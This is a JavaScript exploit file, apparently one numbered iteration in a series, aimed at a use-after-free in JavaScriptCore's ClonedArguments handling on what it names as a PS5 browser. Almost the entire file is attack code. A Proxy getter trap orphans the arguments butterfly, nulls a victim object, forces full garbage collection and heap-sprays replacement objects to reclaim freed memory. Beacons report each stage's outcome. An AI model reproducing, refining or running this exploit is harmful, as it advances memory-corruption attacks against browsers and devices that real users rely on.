// p248 - ClonedArguments UAF: victim replacement with WeakRef verification
//
// p247 showed VICTIM-ALIVE in all rounds. Root cause: victim's JSValue
// sits on the C++ stack (LLInt C-loop registers) and conservative GC
// pins it alive even after victim = null.
//
// Fixes:
// 1. Create victim in a SEPARATE function whose stack frame dies
//    before the Proxy trap fires
// 2. Use WeakRef to verify whether GC actually collected the victim
// 3. Force FULL GC (not just eden) with massive allocation + finalization
// 4. Interleave setTimeout to let stack frames unwind
//
// Beacon prefix: V248-

(function() {
  function B(tag, body) {
    var url = '/beacon/V248-' + tag + '?t=' + Date.now();
    try {
      if (body) navigator.sendBeacon(url, String(body).substring(0, 900));
      else new Image().src = url;
    } catch(e) {}
  }
  function hex(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }

  B('BOOT');

  function target() { return arguments; }
  function reader() { return Array.prototype.slice.call(arguments); }

  // Phase A: Test if WeakRef + FinalizationRegistry work on PS5
  var testObj = {test: 1};
  var testWR;
  try {
    testWR = new WeakRef(testObj);
    B('WEAKREF-OK');
  } catch(e) {
    B('WEAKREF-FAIL-' + e.message.substring(0, 30));
  }

  var frWorks = false;
  try {
    var testFR = new FinalizationRegistry(function() {});
    testFR.register({}, 'test');
    frWorks = true;
    B('FINREG-OK');
  } catch(e) {
    B('FINREG-FAIL');
  }

  // Phase B: Create victim in isolated function, return args + weakref
  function createVictimArgs() {
    var v = {victimA: 0xAAAA, victimB: 0xBBBB, pad1: 'X', pad2: 'Y'};
    var wr = new WeakRef(v);

    var N = 64;
    var HOLE = 5;
    var a = [];
    for (var i = 0; i < N; i++) {
      if (i === 0 || i === 1) a.push(v);
      else if (i === HOLE) a.push(i + 1);
      else a.push(i + 1);
    }

    var args = target.apply(null, a);
    delete args[HOLE];
    // v goes out of scope when this function returns
    // Its stack frame (with v's JSValue) is unwound
    return {args: args, wr: wr};
  }

  function attempt(round) {
    // Step 1: Create victim in separate function
    var setup = createVictimArgs();
    var args = setup.args;
    var victimWR = setup.wr;

    // Verify victim is still alive (should be, referenced from args butterfly)
    var alive = victimWR.deref();
    B('R' + round + '-PRE-' + (alive ? 'ALIVE' : 'DEAD'));

    // Step 2: Overwrite stack by calling many functions to push
    // createVictimArgs's stack frame data off the C++ stack
    function stackWash(depth) {
      var junk = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16];
      if (depth > 0) return stackWash(depth - 1) + junk.length;
      return junk.length;
    }
    stackWash(50);

    var trapFired = false;
    var sprayObjs = [];
    var gcCollected = false;

    var trap = {
      get: function(t, prop) {
        if (trapFired) return 0xFACE;
        trapFired = true;

        // Step 3: Grow butterfly -> orphan old
        for (var j = 100; j < 800; j++) {
          args[j] = 0x41414141;
        }

        // Step 4: Remove victim from NEW butterfly
        args[0] = null;
        args[1] = null;

        // Step 5: Stack wash again inside trap
        stackWash(30);

        // Step 6: Force FULL GC with massive allocation
        // Key: allocate enough to exceed JSC's eden size threshold
        // and trigger a full collection
        for (var g = 0; g < 100; g++) {
          var batch = [];
          for (var k = 0; k < 20000; k++) {
            batch.push({x: k, y: k + 1, z: String(k)});
          }
          batch = null;
        }

        // Step 7: Check if victim was collected
        var vCheck = victimWR.deref();
        if (!vCheck) {
          gcCollected = true;
          B('R' + round + '-GC-COLLECTED');
        } else {
          B('R' + round + '-GC-STILL-ALIVE');
        }

        // Step 8: If collected, spray to reclaim victim's memory
        if (gcCollected) {
          sprayObjs = [];
          for (var s = 0; s < 10000; s++) {
            sprayObjs.push({
              sprayA: 0xC0FE0000 + (s & 0xFFFF),
              sprayB: 0xDEAD0000 + (s & 0xFFFF),
              pad1: 'SPRAY', pad2: 'DATA'
            });
          }
          B('R' + round + '-SPRAYED-' + sprayObjs.length);
        } else {
          // Even if not collected, spray anyway to test
          sprayObjs = [];
          for (var s2 = 0; s2 < 5000; s2++) {
            sprayObjs.push({
              sprayA: 0xC0FE0000 + (s2 & 0xFFFF),
              sprayB: 0xDEAD0000 + (s2 & 0xFFFF),
              pad1: 'S', pad2: 'D'
            });
          }
        }

        return 0xBEEF;
      }
    };

    Object.setPrototypeOf(args, new Proxy({}, trap));

    var result;
    try {
      result = reader.apply(null, args);
    } catch(e) {
      B('R' + round + '-ERR-' + e.message.substring(0, 40));
      return null;
    }

    if (!result) { B('R' + round + '-NO-RESULT'); return null; }

    // Check slot 0
    var v0 = result[0];
    if (typeof v0 === 'object' && v0 !== null) {
      if (v0.sprayA !== undefined) {
        B('R' + round + '-REPLACED-' + hex((v0.sprayA >>> 0)));
        return {hit: true, obj: v0, round: round};
      } else if (v0.victimA !== undefined) {
        B('R' + round + '-VICTIM-ALIVE');
      } else {
        B('R' + round + '-UNKNOWN-OBJ');
        try { B('R' + round + '-KEYS-' + Object.keys(v0).join(',')); } catch(e) {}
      }
    } else if (v0 === null || v0 === undefined) {
      // Victim was collected AND spray didn't land = null/undefined read
      B('R' + round + '-NULLISH-' + (gcCollected ? 'COLLECTED' : 'NOT'));
    } else if (typeof v0 === 'number') {
      var buf = new ArrayBuffer(8);
      new Float64Array(buf)[0] = v0;
      var dv = new DataView(buf);
      B('R' + round + '-NUM-' + hex(dv.getUint32(4, false)) + hex(dv.getUint32(0, false)));
    }

    // Post-trap WeakRef check
    var postCheck = victimWR.deref();
    B('R' + round + '-POST-' + (postCheck ? 'ALIVE' : 'DEAD'));

    return null;
  }

  // Phase C: Run with setTimeout between rounds to let stacks fully unwind
  var round = 0;
  function runNext() {
    if (round >= 8) {
      B('ALL-DONE');
      return;
    }
    var res = attempt(round);
    if (res && res.hit) {
      B('SUCCESS-R' + res.round);
      B('SPRAY-A-' + hex((res.obj.sprayA || 0) >>> 0));
      return;
    }
    round++;
    setTimeout(runNext, 50);
  }
  runNext();
})();
